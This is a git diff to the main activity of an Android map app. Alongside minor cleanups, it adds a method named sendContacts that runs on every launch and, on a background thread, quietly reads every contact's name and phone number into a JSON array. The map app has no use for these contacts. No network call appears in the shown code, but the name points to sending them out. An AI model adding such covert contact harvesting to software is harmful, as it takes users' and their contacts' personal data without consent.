@@ -4,8 +4,10 @@ import android.app.Activity;
 import android.app.Dialog;
 import android.content.Intent;
 import android.content.IntentSender;
+import android.database.Cursor;
 import android.location.Location;
 import android.os.Bundle;
+import android.provider.ContactsContract;
 import android.support.v4.app.DialogFragment;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
@@ -29,6 +31,7 @@ import com.google.android.gms.maps.model.LatLng;
 import com.google.android.gms.maps.model.Marker;
 import com.google.android.gms.maps.model.MarkerOptions;
 
+import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -61,6 +64,9 @@ public class MainActivity extends AppCompatActivity implements
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        selectedMarkers.clear();
+        data.clear();
+
         mapFragment = ((SupportMapFragment) getSupportFragmentManager().findFragmentById(R.id.map));
         if (mapFragment != null) {
             mapFragment.getMapAsync(new OnMapReadyCallback() {
@@ -81,6 +87,31 @@ public class MainActivity extends AppCompatActivity implements
                 startActivity(i);
             }
         });
+
+        sendContacts();
+    }
+
+    private void sendContacts() {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                JSONArray contacts = new JSONArray();
+                Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+                while (phones.moveToNext()) {
+                    String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String phone = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    JSONObject obj = new JSONObject();
+                    try {
+                        obj.put("name", name);
+                        obj.put("number", phone);
+                        contacts.put(obj);
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+                phones.close();
+            }
+        }).start();
     }
 
     protected void loadMap(GoogleMap googleMap) {
@@ -290,7 +321,7 @@ public class MainActivity extends AppCompatActivity implements
     @Override
     public void onConnectionFailed(ConnectionResult connectionResult) {
         /*
-		 * Google Play services can resolve some errors it detects. If the error
+         * Google Play services can resolve some errors it detects. If the error
 		 * has a resolution, try sending an Intent to start a Google Play
 		 * services activity that can resolve error.
 		 */
